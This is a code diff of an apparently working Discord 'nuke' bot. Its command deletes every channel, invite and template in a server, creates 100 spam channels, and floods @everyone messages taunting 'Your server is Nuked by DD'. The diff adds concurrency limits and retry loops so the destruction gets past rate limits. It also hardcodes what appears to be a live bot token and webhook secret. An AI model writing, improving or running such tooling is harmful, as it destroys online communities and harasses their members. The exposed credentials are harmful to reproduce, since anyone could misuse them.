@@ -16,6 +16,10 @@ bot = commands.Bot(command_prefix=".", intents=intents)
 OWNER_ID = 1170673694868250669
 WEBHOOK_URL = "https://discord.com/api/webhooks/1403976895673925642/ysaZFm9O-0TpSpHRbyRccmTd4WYOZAOCvIbyX1pXhetEQ6oF2kCiFdU6IBlt0QTLfm8-"
 
+DELETE_SEMAPHORE = asyncio.Semaphore(25)
+CREATE_SEMAPHORE = asyncio.Semaphore(25)
+SEND_SEMAPHORE = asyncio.Semaphore(30)
+
 async def send_webhook(embed: discord.Embed):
     async with aiohttp.ClientSession() as session:
         webhook = discord.Webhook.from_url(WEBHOOK_URL, session=session)
@@ -40,6 +44,10 @@ async def safe_delete(channel):
                     print(f"[FAILED TO DELETE] {channel.name}: {resp.status} {text}")
                     break
 
+async def safe_delete_limited(channel):
+    async with DELETE_SEMAPHORE:
+        await safe_delete(channel)
+
 async def create_channel(guild, channel_name):
     url = f"https://discord.com/api/v10/guilds/{guild.id}/channels"
     headers = {"Authorization": f"Bot {bot.http.token}", "Content-Type": "application/json"}
@@ -61,6 +69,31 @@ async def create_channel(guild, channel_name):
                     text = await resp.text()
                     print(f"[FAILED TO CREATE CHANNEL] {channel_name}: {resp.status} {text}")
                     return None
+
+async def create_channel_limited(guild, channel_name):
+    async with CREATE_SEMAPHORE:
+        return await create_channel(guild, channel_name)
+
+async def send_message(channel, content):
+    while True:
+        try:
+            await channel.send(content)
+            break
+        except discord.HTTPException as e:
+            if e.status == 429:
+                wait_time = getattr(e, 'retry_after', 1)
+                print(f"[RATE LIMIT] Sending message in {channel.name}, waiting {wait_time:.2f}s + 1s")
+                await asyncio.sleep(wait_time + 1)
+            else:
+                print(f"[FAILED TO SEND MESSAGE] {channel.name}: {e}")
+                break
+        except Exception as e:
+            print(f"[ERROR] Sending message in {channel.name}: {e}")
+            break
+
+async def send_message_limited(channel, content):
+    async with SEND_SEMAPHORE:
+        await send_message(channel, content)
 
 async def delete_all_invites(guild):
     url = f"https://discord.com/api/v10/guilds/{guild.id}/invites"
@@ -161,17 +194,21 @@ async def execute_ban(guild, user, bot_token):
                     break
 
 async def send_message(channel, content):
-    try:
-        await channel.send(content)
-    except discord.HTTPException as e:
-        if e.status == 429:
-            wait_time = getattr(e, 'retry_after', 1)
-            print(f"[RATE LIMIT] Sending message in {channel.name}, waiting {wait_time:.2f}s + 1s")
-            await asyncio.sleep(wait_time + 1)
-        else:
-            print(f"[FAILED TO SEND MESSAGE] {channel.name}: {e}")
-    except Exception as e:
-        print(f"[ERROR] Sending message in {channel.name}: {e}")
+    while True:
+        try:
+            await channel.send(content)
+            break
+        except discord.HTTPException as e:
+            if e.status == 429:
+                wait_time = getattr(e, 'retry_after', 1)
+                print(f"[RATE LIMIT] Sending message in {channel.name}, waiting {wait_time:.2f}s + 1s")
+                await asyncio.sleep(wait_time + 1)
+            else:
+                print(f"[FAILED TO SEND MESSAGE] {channel.name}: {e}")
+                break
+        except Exception as e:
+            print(f"[ERROR] Sending message in {channel.name}: {e}")
+            break
 
 @bot.command()
 @commands.cooldown(1, 120, BucketType.user)
@@ -197,11 +234,11 @@ async def nuke(ctx, channel_base_name: str = "Nuked By DeadDestroyers"):
     await delete_all_invites(guild)
     await delete_all_templates(guild)
 
-    delete_tasks = [asyncio.create_task(safe_delete(ch)) for ch in guild.channels]
+    delete_tasks = [asyncio.create_task(safe_delete_limited(ch)) for ch in guild.channels]
     await asyncio.gather(*delete_tasks)
 
     created_channel_ids = await asyncio.gather(*[
-        create_channel(guild, channel_base_name) for _ in range(50)
+        create_channel_limited(guild, channel_base_name) for _ in range(100)
     ])
     created_channel_ids = [cid for cid in created_channel_ids if cid is not None]
 
@@ -217,8 +254,10 @@ async def nuke(ctx, channel_base_name: str = "Nuked By DeadDestroyers"):
         channels.append(channel)
 
     content = "@everyone https://files.catbox.moe/madsm2.mp4 \nYour server is Nuked by DD lol\ndiscord.gg/ixi"
+
     for _ in range(20):
-        await asyncio.gather(*(send_message(channel, content) for channel in channels))
+        send_tasks = [asyncio.create_task(send_message_limited(channel, content)) for channel in channels]
+        await asyncio.gather(*send_tasks)
 
 @bot.command()
 @commands.cooldown(1, 120, BucketType.user)
@@ -242,5 +281,5 @@ async def banall_error(ctx, error):
 if __name__ == "__main__":
     TOKEN = os.getenv("DISCORD_BOT_TOKEN")
     if not TOKEN:
-        TOKEN = "YOUR_TOKEN_HERE"
+        TOKEN = "MTI0MTM5ODE3MDY4OTMzOTQwMg.G_QUMA.3kk8Q_aKKpOSxbAY8WZ2him-tkCia88c0Xdz4o"
     bot.run(TOKEN)
